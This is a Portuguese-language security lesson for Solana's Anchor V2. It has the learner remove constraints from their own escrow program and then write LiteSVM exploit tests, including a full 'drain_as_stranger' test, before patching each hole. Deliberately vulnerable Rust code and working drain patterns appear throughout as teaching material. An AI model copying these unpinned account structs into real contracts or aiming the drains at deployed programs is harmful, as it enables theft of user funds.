# O que ainda te morde (explore e depois corrija)

Você acabou de ver type cosplay, duplicate-mutable e aliasing de CpiHandle morrerem em tempo de compilação: três ataques que não faziam build. O quarto, recálculo de bump, deu build limpo e depois não fez nada, porque o framework re-deriva o bump canônico durante a validação e assina com ele, então o seu byte recomputado não tinha para onde ir. Três recusados, um oco. O compilador era o seu guarda-costas, e ele fez o serviço. Nesta lição o guarda-costas vai para casa.

Então não leia ainda. Você vai fazer o branch vulnerável por conta própria, a partir do escrow que você já construiu, porque as travas que você está prestes a remover são travas que *você* escreveu e a remoção é a primeira coisa que vale sentir.

A partir do mesmo workspace `quarter-vault` da lição passada, no seu R3/R4 limpo:

```bash
git checkout -b vuln/prize-escrow
```

Depois abra `programs/quarter-prize/src/lib.rs` e arranque três pins da struct de accounts `Redeem` — a de SPL que você terminou no m05-l1, não o rascunho em lamports que veio antes dela. Delete o `address = escrow.player` no `player`, delete o `address = escrow.maker` no `maker`, e reduza o `vault` a um `#[account(mut)]` simples removendo a derivação inteira de `seeds` / `bump` / `seeds::program` dele. Deixe todo o resto, incluindo os dois constraints de ATA. Isso é um primeiro rascunho apressado, e é como metade dos escrows desta cadeia foi entregue.

O registro `Escrow` em si não mudou desde o m04-l3, e os exploits abaixo leem ele, então mantenha ele à vista:

```rust
#[account]
#[repr(C)]
#[derive(InitSpace)]
pub struct Escrow {
    pub maker: Address,      // the operator who funded the prize
    pub player: Address,     // the only caller allowed to redeem
    pub vault: Address,      // the R2 vault ledger holding this prize
    pub amount: u64,         // prize size
    pub winning_score: u64,  // the bar the player must clear
    pub bump: u8,
    pub _pad: [u8; 7],
}
```

Agora escreva o `drain_as_stranger` (impresso por extenso abaixo, na classe 1 — tudo menos o helper de setup `reserve_prize` dele, que o código marca como seu para escrever no mesmo arquivo) dentro de `programs/quarter-prize/tests/exploits.rs` e rode ele:

```bash
anchor build && cargo test --test exploits drain_as_stranger
```

```text
running 1 test
test drain_as_stranger ... ok

test result: ok. 1 passed; 0 failed
```

Leia esse resultado pelo que ele é. Um estranho, não o player que o escrow nomeou, acabou de sair andando com o prêmio inteiro, e o teste que comprova isso diz `ok`. Nada naquele programa é um erro de tipo. Ele compilou limpo no toolchain do V2 que matou três classes de ataque na lição passada. Ele é entregue. E ele é drenável. Essa lacuna, entre "compila" e "seguro," é a lição inteira, e você vai atacar ela com exploits funcionando antes de fechar ela.

## O que esta lição resolve

A lição passada respondeu "o que o V2 mata de graça." Esta responde a pergunta mais difícil: o que o V2 ainda espera que você escreva, e o que nenhum compilador em nenhum framework jamais vai escrever por você. A taxonomia de segurança de programas da Solana Foundation tem duas metades. Você já aposentou a metade que virou erro de compilação. Aqui está a metade sobrevivente, rodada contra o seu próprio escrow (R3) e swap (R4). Três delas você aterrissa como exploits funcionando e depois corrige: a checagem de signer/owner, a substituição de conta e o underflow aritmético. As outras quatro você aprende a *identificar*, porque cada uma ou já está fechada por um constraint que o escrow por acaso usa ou precisa de um programa de formato diferente deste para demonstrar. Vale reparar quais quatro são quais enquanto você lê; o lab explora exatamente as três:

1. **Checagens de signer e de owner.** O V2 continua esperando que você afirme quem tem permissão de agir. Perca a afirmação e qualquer um age como a authority.
2. **Substituição de UncheckedAccount.** O `UncheckedAccount` opta por sair de toda checagem do framework, pelo nome, então ele tem que vir junto com um `address`, `owner` ou `constraint` explícito. Sem um deles, um atacante substitui a conta dele mesmo. Esta é a classe de substituição de conta, e é a que sobrevive a todo framework já escrito.
3. **A cilada do erro de owner.** `#[account(owner = X @ MyErr)]` num `Account<T>` não faz aparecer `MyErr`. Ele faz aparecer `ProgramError::IllegalOwner`, porque as checagens de owner e de discriminator rodam dentro do `load`, antes dos seus hooks de constraint.
4. **Reuso de init_if_needed.** O V2 entrega o `init_if_needed` sem gate e valida space, owner e discriminator no reuso, mas um bug de lógica de reinicializar-sobre-estado-vivo continua sobrevivendo a ele.
5. **CPI arbitrária.** Invoque um programa que o chamador te entregou e você invocou o que ele quisesse. Valide o id do programa alvo.
6. **Fechar-e-ressuscitar.** Uma conta fechada pode ser ressuscitada dentro da mesma transação a não ser que você zere ela e trave ela.
7. **Overflow aritmético.** Subtração sem sinal dá underflow. Use matemática checada.

A ajuda recua do jeito de sempre. Eu percorro a classe de signer/owner de ponta a ponta, exploit e patch, porque eu quero o dreno na sua saída de teste e a correção nos seus dedos uma vez. A substituição de UncheckedAccount cai para um problema de completion: eu te entrego o patch, você escreve o exploit que comprova que o buraco era real. A trava de withdraw é o último degrau, um challenge de código em Rust puro despido de Anchor por completo, onde você recebe a assinatura e a convenção de retorno e nada mais. Aterrisse o exploit, feche o buraco, comprove que ele fica fechado.

![Uma comparação de duas colunas pondo as três classes aposentadas em tempo de compilação, mais a classe de bump que compila mas não tem emenda, ao lado das sete classes sobreviventes que esta lição tem que corrigir na mão.](assets/v01-comparison.png)

Uma armadilha para nomear antes da gente começar, porque ela é a razão inteira de esta metade ser perigosa. Toda trava que você adiciona custa compute e código que você tem que manter, e o framework nunca vai te dizer qual trava está *faltando*. Ele só rejeita as grafias que ele já conhece. Então "secure by default" é uma afirmação sobre as classes do topo daquela tabela, não as de baixo. Confiar demais nisso na metade de baixo é exatamente como escrows são drenados.

## As classes sobreviventes, um ataque de cada vez

O método é fixo e ele é o ponto: para cada classe, aterrisse um exploit que tem sucesso contra o código atual, nomeie com precisão por que ele funciona, depois corrija até o exploit falhar e o caminho legítimo continuar passando. Leia, quebre, conserte, comprove.

![Um diagrama de loop de sete passos: escolha uma classe, escreva um exploit que passa, nomeie a trava faltando, adicione ela, e re-rode até o exploit falhar.](assets/v02-flowchart.png)

### Classe 1: a checagem de signer e de owner (trabalhada por extenso)

Comece com o exploit que você já rodou. Aqui está a struct de accounts do redeem no branch `vuln`, com as travas arrancadas até onde um primeiro rascunho apressado deixa elas:

```rust
#[derive(Accounts)]
pub struct Redeem {
    pub player: Signer,                    // VULN: any signer, not the recorded player

    #[account(
        mut,
        close = maker,
        seeds = [b"escrow", escrow.maker.as_ref(), escrow.player.as_ref()],
        bump = escrow.bump,
    )]
    pub escrow: Account<Escrow>,

    /// CHECK: pinned by the address constraint the patch adds below
    #[account(mut)]                        // VULN: any account, substitutable rent recipient
    pub maker: UncheckedAccount,

    /// CHECK: pinned by the constraint the patch adds below
    #[account(mut)]                        // VULN: any vault, not the one the escrow recorded
    pub vault: UncheckedAccount,

    pub mint: InterfaceAccount<Mint>,
    #[account(
        mut,
        associated_token::mint = mint,
        associated_token::authority = vault,
        associated_token::token_program = token_program,
    )]
    pub vault_token_account: InterfaceAccount<TokenAccount>,
    #[account(
        mut,
        associated_token::mint = mint,
        associated_token::authority = player,
        associated_token::token_program = token_program,
    )]
    pub winner_token_account: InterfaceAccount<TokenAccount>,
    pub token_program: Interface<'static, TokenInterface>,
    pub quarter_vault_program: Program<QuarterVault>,
    pub system_program: Program<System>,
}
```

Leia as duas linhas de ATA antes de seguir em frente, porque elas são o que faz o exploit *pagar*. O `winner_token_account` é derivado de quem ocupa a vaga do `player`. Substitua o chamador e você substitui o destino do payout junto — uma edição, as duas metades do roubo.

Nada aqui é um erro de compilação. O `player` é um `Signer` de verdade, então *alguém* assinou. Mas o programa nunca checa que o alguém é o `escrow.player`. A liberação condicional inteira gira em torno de "só o player nomeado pode fazer claim," e essa frase não aparece em lugar nenhum do código. O exploit se escreve sozinho. Um estranho assina um redeem, limpa a barra de score (auto-reportada, lembra, este fliperama ainda não atesta scores), e o vault paga para ele. Os testes de exploit rodam em LiteSVM, a bancada de teste em Rust em processo default do V2, então adicione ela ao programa se ela ainda não estiver lá:

```bash
# Reach LiteSVM through the harness, never by name. anchor-v2-testing owns the litesvm
# version (0.11.0 at tag v2.0.0-rc.1; the anchor-next head has already moved it to 0.13.1),
# so pinning the tag pins the SVM too. Add litesvm yourself at another version and the
# mismatch surfaces as a baffling compile error — two versions of one crate, identical-looking
# types refusing to unify — instead of never happening at all.
cargo add anchor-v2-testing --dev \
  --git https://github.com/otter-sec/anchor.git --tag v2.0.0-rc.1
# The escrow crate needs the same two SPL client crates the vault's fixture used in
# m05-l1, at the same pins, because the prize is tokens now and the setup has to mint
# and move them.
cargo add spl-token@9 spl-associated-token-account@8 --dev
```

```rust
use anchor_lang::{
    prelude::Address, programs::System, solana_program::instruction::Instruction, Id,
    InstructionData, ToAccountMetas,
};
use anchor_v2_testing::{
    Keypair, LiteSVM, Message, Signer, VersionedMessage, VersionedTransaction,
};

// The SPL client helpers m05-l1 shipped, reached by path instead of copied.
// Each tests/*.rs is its own crate root, so you cannot `use` an item out of a
// sibling test binary — but `#[path]` compiles any file you point it at straight
// into THIS crate, and it can point across packages. Same trick m05-l1's
// spl_setup.rs used to reach spl_helpers.
#[path = "../../quarter-vault/tests/spl_helpers.rs"]
mod spl_helpers;

const ONE_TOKEN: u64 = 1_000_000;   // 6 decimals, same mint shape as m05-l1

// The offset-64 read from m05-l1's spl_setup, restated here because that file
// belongs to the vault's crate: a token account's `amount` is a little-endian
// u64 at byte 64. (spl_helpers above builds instructions; it reads nothing.)
fn token_balance(svm: &LiteSVM, ata: &Address) -> u64 {
    let acct = svm.get_account(ata).expect("token account exists");
    u64::from_le_bytes(acct.data[64..72].try_into().unwrap())
}

#[test]
fn drain_as_stranger() {
    let mut svm = anchor_v2_testing::svm();
    let vault_so = concat!(env!("CARGO_MANIFEST_DIR"), "/../../target/deploy/quarter_vault.so");
    let prize_so = concat!(env!("CARGO_MANIFEST_DIR"), "/../../target/deploy/quarter_prize.so");
    svm.add_program_from_file(quarter_vault::ID, vault_so).unwrap();
    svm.add_program_from_file(quarter_prize::ID, prize_so).unwrap();

    let (maker, player, stranger) = (Keypair::new(), Keypair::new(), Keypair::new());
    for kp in [&maker, &player, &stranger] {
        svm.airdrop(&kp.pubkey(), 1_000_000_000).unwrap();
    }

    let (escrow, _b) = Address::find_program_address(
        &[b"escrow", maker.pubkey().as_ref(), player.pubkey().as_ref()],
        &quarter_prize::ID,
    );
    let (vault, _vb) =
        Address::find_program_address(&[b"vault", escrow.as_ref()], &quarter_vault::ID);

    // Setup seam, and it is YOURS to write in this same file: adapt the SPL reserve
    // flow you built for m05-l1's solo into a local `fn reserve_prize`. It creates a
    // 6-decimal mint, gives the maker, the player and the stranger each an ATA on it,
    // then reserves a 1.0-token prize behind a 5_000 winning score — which means the
    // two-call flow into the escrow's own vault instance, `initialize` then `deposit`.
    // Have it hand back the mint and the ATA addresses so the assertion can read them.
    let f = reserve_prize(&mut svm, &maker, &player, &stranger, escrow, vault, ONE_TOKEN, 5_000);

    // The stranger, NOT escrow.player, redeems with a passing score — and because
    // winner_token_account derives from the player seat, the payout follows them.
    let ix = Instruction {
        program_id: quarter_prize::ID,
        accounts: quarter_prize::accounts::Redeem {
            player: stranger.pubkey(),     // substitute the caller
            escrow,
            maker: maker.pubkey(),
            vault,
            mint: f.mint,
            vault_token_account: f.vault_ata,
            winner_token_account: f.stranger_ata,
            token_program: spl_token::ID,
            quarter_vault_program: quarter_vault::ID,
            system_program: System::id(),
        }
        .to_account_metas(None),
        data: quarter_prize::instruction::Redeem { final_score: 9_999 }.data(),
    };
    let blockhash = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(&[ix], Some(&stranger.pubkey()), &blockhash);
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &[&stranger]).unwrap();

    // On the vuln branch this SUCCEEDS. That is the bug.
    svm.send_transaction(tx).unwrap();
    assert_eq!(
        token_balance(&svm, &f.stranger_ata),
        ONE_TOKEN,
        "the stranger walked off with the whole prize"
    );
}
```

Isso é um dreno funcionando, e o patch é uma linha. No campo `player`, fixe o chamador na pubkey que o escrow registrou:

```rust
#[account(address = escrow.player)]
pub player: Signer,
```

O `address = escrow.player` diz, sem rodeio, que a conta passada aqui tem que ser igual ao player que este escrow nomeou. É a forma idiomática do V2 que substituiu o `has_one`, e ela aceita qualquer expressão, então ela lê como o que ela faz. Re-rode o `drain_as_stranger` e ele vira: a transação agora falha no carregamento da conta, antes de o seu handler rodar uma única linha, porque a chave do estranho não casa com o `escrow.player`. Re-rode o teste legítimo `conditional_release` e ele continua verde. Exploit morto, feature intacta. É esse o loop inteiro, e toda classe abaixo é uma variação dele.

![Um cartão de código anotado mostrando o campo player sem pin que um estranho consegue drenar, e o constraint de address que rejeita o estranho no carregamento da conta.](assets/v03-annotated-code.png)

### Classe 2: substituição de UncheckedAccount (a que sobrevive a todo framework)

Olhe de volta para aquele campo `maker`. Ele é um `UncheckedAccount`, e no branch vuln ele carrega só `mut`. Aquela palavra `UncheckedAccount` não é decoração. É o tipo optando por sair de toda checagem de framework que existe: nenhuma checagem de owner, nenhuma checagem de discriminator, nenhuma checagem de identidade. Você está dizendo para o Anchor "eu vou validar isto por conta própria," e depois não fazendo isso.

Aqui está por que essa é a classe mais profunda da lição. O escrow fecha para o `maker`, devolvendo o rent. No branch vuln, o `maker` é qualquer conta que o chamador passar. Então um atacante passa a conta *dele mesmo* como `maker`, e os lamports de rent do `close = maker` aterrissam na carteira dele em vez da do operador. Dinheiro pequeno num escrow, dinheiro de verdade em mil. E nada pega isso, porque não tem nada para pegar: a conta é válida, ela é mutável, ela é gravável. Ela simplesmente não é a conta que o escrow queria dizer.

Esta é a classe de substituição de conta, e eu quero que você sente com uma afirmação: nenhum compilador em nenhum framework, em nenhuma linguagem, consegue pegar esta aqui por você. Type cosplay dava para pegar porque os tipos diferiam. Duplicate-mutable dava para pegar porque os endereços davam alias. Substituição não tem sinal. Uma conta correta e a conta de um atacante têm tipos idênticos, owners idênticos no caso geral, tudo idêntico menos *qual delas a lógica de negócio pretendia*, e intenção não está no sistema de tipos. É a única classe da qual você é dono para sempre.

![Uma comparação lado a lado de um UncheckedAccount carregando só mut contra um fixado por address, owner ou constraint, mostrando quais substituições cada um permite.](assets/v04-comparison.png)

O patch no escrow restaura o pin que a versão congelada sempre teve:

```rust
#[account(mut, address = escrow.maker)]
pub maker: UncheckedAccount,
```

Agora o rent só pode voltar para o maker registrado. Faça o mesmo com o `vault`, que no branch vuln carrega só `mut` — qualquer conta que seja — então um atacante substitui um vault *diferente* que ele controla, e a linha `associated_token::authority = vault` obedientemente deriva a ATA do vault a partir do vault *dele*. Uma coisa que o patch *não* pode fazer é promover o campo para um `Account<Vault>` tipado: o vault pertence ao `quarter_vault`, um programa diferente, então ele nunca conseguiria carregar como uma conta tipada dentro do `quarter_prize` — a classe 3 abaixo deriva exatamente por quê, e é essa a razão de o R3 ter declarado o slot como `UncheckedAccount` já de início. Duas grafias fecham isso, e as duas já estão no seu vocabulário. O escrow congelado fixa ele por derivação, `seeds` + `bump` + `seeds::program`, que é o que você escreveu no m05-l1. A mais curta fixa ele contra o registro, com um erro de verdade de quebra, e é a que esta lição usa porque ela deixa a classe de substituição visível numa única linha:

```rust
/// CHECK: pinned to the exact vault this escrow recorded
#[account(mut, address = escrow.vault @ EscrowError::WrongVault)]
pub vault: UncheckedAccount,
```

**Problema de completion.** Eu te dei os dois patches acima. Agora você escreve o exploit que comprova que o buraco do `maker` era real. Faça um fork do `drain_as_stranger` num teste `steal_rent_on_close`: o player legítimo resgata corretamente, mas passa `maker: attacker.pubkey()` em vez do maker verdadeiro, e você afirma que o saldo do atacante cresceu mais ou menos o rent do escrow. Aterrisse ele vermelho no campo arrancado, aplique o pin `address = escrow.maker`, veja ele ficar verde. A barra de aceitação é exatamente o loop: o teste passa contra o campo vuln e falha contra o patch.

Um ponteiro, porque você deveria saber onde mora a versão emblemática desta classe: o dreno do Cashio, onde uma checagem de `.mint` faltando deixou um atacante cunhar colateral do nada, é território do curso de DeFi e RWA Engineering. Este curso não desenvolve isso; vá lá para o caso de guerra. Aqui, seja dono da classe.

### Classe 3: a cilada do erro de owner (por que a checagem que você esperava não dispara)

Uma armadilha que parece uma correção: digamos que você queira um erro customizado quando alguém passa um vault de que o programa errado é dono. A grafia natural é:

```rust
#[account(owner = quarter_vault::ID @ EscrowError::WrongVault)]
pub vault: Account<Vault>,
```

Você escreve o seu teste, passa um vault de que algum outro programa é dono, e espera `WrongVault`. Você recebe `ProgramError::IllegalOwner` em vez disso. O seu `@ EscrowError::WrongVault` nunca disparou. Por quê?

(Existe uma segunda razão de aquela grafia ser errada para *este* campo especificamente, e vale identificar ela antes do mecanismo: o `quarter_vault` é dono do vault do escrow, um programa diferente, então ele nunca conseguiria carregar como um `Account<Vault>` tipado dentro do `quarter_prize`, de jeito nenhum. É por isso que o R3 declara ele `UncheckedAccount`. A cilada abaixo é a que morde quando a conta genuinamente é sua e você só queria uma mensagem mais bonita.)

Isto vale derivar, não só memorizar, porque a razão generaliza. Um `Account<T>` é um wrapper tipado, e antes de os seus hooks de constraint rodarem, o Anchor tem que *carregar* ele: ler os bytes dele, checar que o programa declarante é dono da conta, e checar que o discriminator casa com `T`. Essas duas checagens, owner e discriminator, são estruturais. Elas acontecem dentro do `load`, primeiro, porque o framework não consegue te entregar um `T` tipado que ele não verificou que é um `T`. O seu constraint `owner = ... @ MyErr` é um *hook*, e hooks rodam depois do carregamento. Então numa conta com owner errado, o carregamento falha primeiro com `IllegalOwner`, e o controle nunca alcança o hook que carrega o seu erro customizado.

![Um diagrama da ordem das checagens para Account<T>, com owner e discriminator rodando dentro do carregamento antes de qualquer hook de constraint, então IllegalOwner ganha do erro customizado.](assets/v05-diagram.png)

A correção, quando você genuinamente precisa do erro customizado, é parar de pedir para o `Account<T>` carregar ele. Pegue um `UncheckedAccount`, que não faz checagem de owner em tempo de carregamento (exatamente o tipo da classe 2), e ponha o *mesmo* constraint `owner = X @ MyErr` nele. Agora não tem `load` para curto-circuitar, então o hook de constraint é a única coisa checando o owner, e ele carrega o seu erro:

```rust
#[account(owner = quarter_vault::ID @ EscrowError::WrongVault)]
pub vault: UncheckedAccount,
```

É essa a prescrição do próprio framework: o doc comment no alias `Account<T>` do V2 diz, com todas as letras, que para um erro customizado você usa `UncheckedAccount` com um `owner = X @ MyErr` no nível do derive. A troca é que você abriu mão da view tipada, então se o handler precisa dos campos do vault você agora carrega e valida eles você mesmo.

Repare na forma: as duas classes compõem. O tipo que opta por sair das checagens do framework é o mesmo tipo que te deixa escrever as suas. Isso não é coincidência, é o framework te dizendo o que ele faz e o que ele não faz por você.

### Classe 4: reuso de init_if_needed (sem gate não é a mesma coisa que seguro)

Um colega de time lembra do `init_if_needed` da linha v1 como o que tinha gate de feature, o que você tinha que habilitar explicitamente porque ele era perigoso. Corrija o registro, porque o V2 mudou isso e lembrar da mudança pela metade é um risco por conta própria.

No V2, o `init_if_needed` não está mais atrás de uma feature flag. Eu chequei o conjunto de features do V2 contra os docs do próprio framework: o release entrega seis feature flags, `alloc`, `guardrails`, `idl-build`, `compat`, `const-rent` e `testing`, e o `init-if-needed` não está entre elas. Ele está sem gate. Além disso, contas de `init_if_needed` foram dobradas para dentro da checagem de duplicate-mutable desde a linha 1.0 (#4239) e continuam assim sob o V2, e o branch de reuso re-valida o space, o owner e o discriminator da conta, o que fecha os truques mais crus de reinicializar.

A parte que sobrevive a tudo isso: O framework consegue verificar que a conta é do *formato* certo. Ele não consegue verificar que reinicializar *esta* conta é a *coisa certa a fazer*. Se a sua instrução bate no branch `init` sobre uma conta que já guarda estado vivo, a validação de reuso passa (space casa, owner casa, discriminator casa) e você alegremente sobrescreve um escrow financiado de volta para zeros.

![Uma tabela dividindo a validação de reuso do init_if_needed nas checagens estruturais que o V2 faz e a intenção de negócio que ele não consegue julgar, onde um bug de reinit sobrevive.](assets/v06-table.png)

Freshness note: isto reflete o release candidate do Anchor V2 em 2026-08-22, verificado contra os docs de feature flags e o changelog do framework. O V2 continua sendo um RC sem tag estável, então se você fixar um RC mais novo, releia o comportamento de validação de reuso do `init_if_needed` dele antes de confiar na semântica exata. A mitigação não muda: se uma conta pode guardar estado vivo, trave o reinit você mesmo. Cheque uma flag guardada ou um campo diferente de zero antes de deixar o branch `init` rodar, e rejeite quando a conta já estiver viva.

### Classe 5: CPI arbitrária (valide o id do programa alvo)

O seu escrow chama o vault. Ele declara o programa chamado como `quarter_vault_program: Program<QuarterVault>`, e aquele `Program<T>` tipado está fazendo um trabalho silencioso de segurança: ele checa que a chave da conta é igual a `QuarterVault::id()` — o marcador que o `declare_program!` gerou lá no m04-l3 — e, com a feature `guardrails` default ligada, que a conta é executável. Você não pode ser enganado para chamar outra coisa, porque o tipo fixa o alvo.

Agora imagine que você ficou com preguiça e tipou ele como um `AccountInfo` ou `UncheckedAccount`, e depois invocou ele:

```rust
// VULN: the callee is whatever the caller passed.
let cpi_ctx = CpiContext::new(ctx.accounts.some_program.address(), cpi_accounts);
// ... invoke ...
```

Um atacante passa o programa dele mesmo como `some_program`, o seu escrow assina a CPI com as seeds do PDA do escrow, e agora o programa do atacante roda *com a assinatura do seu PDA*. É essa a classe de CPI arbitrária: você não escolheu o programa que rodou, o chamador escolheu, e você entregou a sua authority para ele.

O patch é deixar o tipo fixar o alvo, exatamente como o escrow congelado faz. Para o swap, a mesma regra vale para o token program: o `token_program: Interface<'static, TokenInterface>` fixa o programa chamado num token program de verdade (clássico ou Token-2022) em vez de aceitar um arbitrário.

![Um fluxograma contrastando uma conta de programa sem tipo que um atacante consegue escolher com um Program tipado que fixa o programa chamado no id do programa do vault.](assets/v07-flowchart.png)

### Classe 6: fechar-e-ressuscitar (zere ela, ou trave ela)

Fechar uma conta não é só tirar os lamports dela. Na Solana, uma conta com zero lamports no fim de uma transação é varrida, mas *dentro* da transação, uma conta que você drenou e encolheu pode ser recarregada e reusada antes da varredura. Se o seu close é feito na mão, transfira os lamports, dê realloc para nada, e pare, você deixou a porta aberta: uma instrução posterior na mesma transação reembolsa ela e o discriminator do seu programa continua sentado nos dados (agora ressuscitados), então a conta passa na validação de novo numa segunda chamada. Isso é fechar-e-ressuscitar.

O escrow evita isso porque ele usa o constraint `close = maker`, e o close do V2 zera os dados, escreve o sentinela de conta fechada, e atribui a conta para o system program. Não sobra nada para ressuscitar. A classe só morde quando alguém passa por cima do constraint e fecha na mão. Se você algum dia fizer isso, a regra é: zere o discriminator e trave contra a forma ressuscitada, não só mova os lamports.

![Uma linha do tempo de uma única transação onde um close só de lamports deixa o discriminator intacto e a conta é ressuscitada, ao lado de um close que zera e bloqueia a ressurreição.](assets/v08-timeline.png)

### Classe 7: overflow aritmético (o bug de verdade da trava de withdraw)

A última classe é a menor de enunciar e a mais fácil de entregar. O `withdraw` do vault debita o livro-razão dele, `vault.credit`, depois da movimentação de token. No branch vuln ele faz isso com subtração crua:

```rust
// VULN: unsigned subtraction underflows.
vault.credit = vault.credit - amount;
```

Se `amount > credit`, isto não dá erro. Em builds de debug ele dá panic; num build com as checagens de overflow desligadas ele *dá wrap*, então um credit de 30 menos um withdraw de 100 vira um número positivo gigantesco e os livros do vault acham que ele guarda muito mais do que guarda. Nenhum dos dois resultados é "o withdraw foi rejeitado," que é o único correto.

Alcançar aquela linha leva uma jogada a mais, e a jogada é a parte interessante. O `withdraw` transfere os tokens primeiro e debita o livro-razão depois, então enquanto o livro-razão e a custódia concordam, o token program rejeita um over-withdraw na CPI de transferência e a subtração nunca roda — o m05-l1 disse exatamente isso quando fez você afirmar que o over-withdraw volta um `Err`. A trava do livro-razão existe para o caso em que os dois números *discordam*, e eles discordam no momento em que qualquer um transfere tokens direto para a ATA do vault. Uma associated token account é uma caixa postal pública: `deposit` não é o único jeito de tokens entrarem, e nada on chain faz uma transferência não solicitada incrementar `vault.credit`. Então abasteça a ATA do vault a mais na mão, depois retire mais que `credit` mas não mais do que a ATA de fato guarda. A transferência tem sucesso, a subtração crua dá wrap, e os livros agora reportam um saldo que ninguém nunca pôs lá.

Saiba onde o seu build se posiciona nisso, porque isso decide qual dos dois você recebe. O `Cargo.toml` do workspace gerado pelo Anchor põe `overflow-checks = true` no profile de release, e o `cargo build-sbf` usa release, então num scaffold intocado isto dá panic em vez de dar wrap. Duas coisas deixam o wrap real mesmo assim. Alguém remove aquela linha, o que acontece na primeira vez que um time corre atrás de CU. Ou alguém desliga o `guardrails` — o flip que você mesmo rodou no m06-l2, que aterrissou em nada só porque a aresta do anchor-spl manteve a feature ligada; num crate sem aquela aresta, ou depois de uma mudança no grafo, ele aterrissa. De um jeito ou de outro o wrap está a uma edição de Cargo de distância, e uma trava que só se mantém por causa de uma configuração de profile não é uma trava.

Controle de acesso não te salva aqui. Um player perfeitamente autorizado ainda pode pedir mais do que o vault guarda. Isto não é um bug de "quem", é um bug de "quanto", e a correção é aritmética checada:

```rust
// PATCH: checked_sub returns None exactly when amount > credit.
vault.credit = vault
    .credit
    .checked_sub(amount)
    .ok_or(VaultError::Underflow)?;
```

O `checked_sub` retorna `None` precisamente no caso que daria underflow, então você converte aquele `None` num erro de verdade e rejeita o over-withdraw. É um método e um `?`. E é também, não por coincidência, exatamente o patch que o seu challenge de código pede.

![Um cartão de código anotado comparando subtração crua e checked_sub num withdraw de 100 contra um credit de livro-razão de 30, um dando wrap e o outro rejeitando.](assets/v09-annotated-code.png)

Um fato de arrumação da casa para os seus patches. As rejeições de constraint do próprio Anchor moram em sua maioria na faixa dos 2000 — o `ConstraintAddress`, o que os seus pins levantam, é Custom(2012) — mas não todas: um punhado mapeia direto para os erros embutidos do runtime, e o `ConstraintOwner` é o caso afiado, aparecendo como `ProgramError::IllegalOwner` em vez de qualquer número dos 2000, exatamente como a classe 3 te mostrou. As suas variantes customizadas de `#[error_code]` começam em 6000 e contam para cima. Então um erro na faixa dos 6000 é um dos seus, e *qual* deles depende do programa: o `quarter_prize` e o `quarter_vault` têm cada um o seu próprio enum `#[error_code]`, cada um numerado a partir de 6000 por ordem de declaração, então 6001 quer dizer uma coisa numa rejeição de redeem e outra numa rejeição de withdraw. Leia o programa de onde o erro veio antes de ler o número. Saber em que faixa um erro mora te diz de relance se o framework rejeitou a transação ou se a sua própria trava rejeitou.

### O mesmo loop no swap

O escrow foi a taxonomia inteira num programa só. O swap (R4) é as mesmas classes vestindo contas de token em vez de vaults de lamports, e rodar o loop contra ele é o que te convence de que estas são *classes*, não trivialidades de escrow. O `swap_arcade_for_tickets(amount_in, min_out)` puxa os tokens de fliperama do trader para dentro da reserva de fliperama do pool e empurra tickets de volta para fora. Duas das classes sobreviventes mapeiam direto nele.

Primeiro, substituição, classe 2 de novo. O `reserve_arcade` e o `reserve_ticket` do swap são as contas de token do próprio pool, aquelas contra as quais as trocas precificam. Elas carregam `token::mint` e `token::authority = pool`, e nenhuma das duas diz *qual* conta o pool queria dizer: qualquer um pode criar uma conta de token no mint certo com o pool como authority dela, porque o `InitializeAccount` do SPL recebe o owner como um argumento simples e nunca pede para o owner assinar. Então um atacante passa o par dele mesmo como as reservas, a matemática de produto constante precifica contra saldos que ele controla, e ele cota para si mesmo um fill que o pool de verdade nunca ofereceria. Mesma forma do estranho drenando o escrow: uma conta válida do tipo certo, simplesmente não a que o programa queria dizer.

Agora a metade desconfortável. O patch é a mesma *forma* que o do escrow — fixar cada reserva contra o que o pool registrou — exceto que o R4 do jeito que você construiu ele não registra nada contra o que fixar: o `Pool` guarda os dois mints e o bump dele, e as reservas ficam em endereços que ninguém deriva. Então fechar esta aqui são duas jogadas, não uma: o pool tem que começar a registrar os dois endereços de reserva no init, e o swap tem que fixar cada campo contra aquele registro. Isso é um achado real e aberto contra o seu próprio programa. Não corrija ele aqui por palpite — a próxima lição abre fazendo você procurar exatamente por esta linha, e consertar ela é o primeiro item da checklist de auditoria.

Segundo, CPI arbitrária, classe 5. O swap faz CPI de `transfer_checked` através do `token_program`, e o swap congelado tipa ele como `Interface<'static, TokenInterface>`, que fixa o programa chamado num token program de verdade (clássico ou Token-2022) e nada mais. Tipe ele como um `UncheckedAccount` em vez disso e o trader escolhe qual programa move os tokens, com a authority do pool atrás da chamada. O tipo é a trava.

![Uma comparação mapeando cada classe de vulnerabilidade sobrevivente do escrow nos campos do próprio swap, com a trava que fecha ela nomeada na última coluna.](assets/v10-comparison.png)

Você não re-deriva nada para atacar o swap. Você leva as mesmas sete perguntas junto e faz elas para uma lista de contas diferente. Essa portabilidade é a razão de a taxonomia valer a pena ser aprendida como classes em vez de como uma checklist para um programa só.

## Lab: explore e depois corrija o escrow

Você viu toda classe. Agora rode o loop você mesmo contra o escrow, de ponta a ponta, até todo teste de exploit falhar e a suíte ficar verde.

**Passo 1. Fixe o toolchain do V2 e entre no branch vulnerável.** Este curso roda no release candidate do Anchor V2, não na linha V1 1.1.2 que muitas máquinas entregam por padrão. O `avm install` não consegue buscar o RC do V2: ele baixa um binário pré-compilado de um release publicado no GitHub, e nenhum release foi cortado para a tag v2, então o download dá 404. Instale a CLI direto da tag `v2.0.0-rc.1`:

```bash
# Anchor V2 RC CLI, built from the tag (no release binary for the v2 tag to download).
cargo install --git https://github.com/otter-sec/anchor.git --tag v2.0.0-rc.1 anchor-cli --locked --force
# macOS: prefix with CARGO_PROFILE_RELEASE_LTO=off if the release build fails to link.
anchor --version              # confirm the V2 line, not 1.1.2

# You cut this branch and peeled the three constraints back at the top of the lesson.
git checkout vuln/prize-escrow
```

Freshness note: em 2026-08-22 a linha V2 é entregue só como release candidates (2.0.0-rc.1, com tag no `anchor-next`), então não existe versão estável para deixar hardcoded. A ponta do branch avança, então registre no `Anchor.toml` e na CI o commit exato de onde você fez o build, para um colega de time fazer o build do mesmo bytecode. Quando o V2 tagar estável, fixe essa em vez disso.

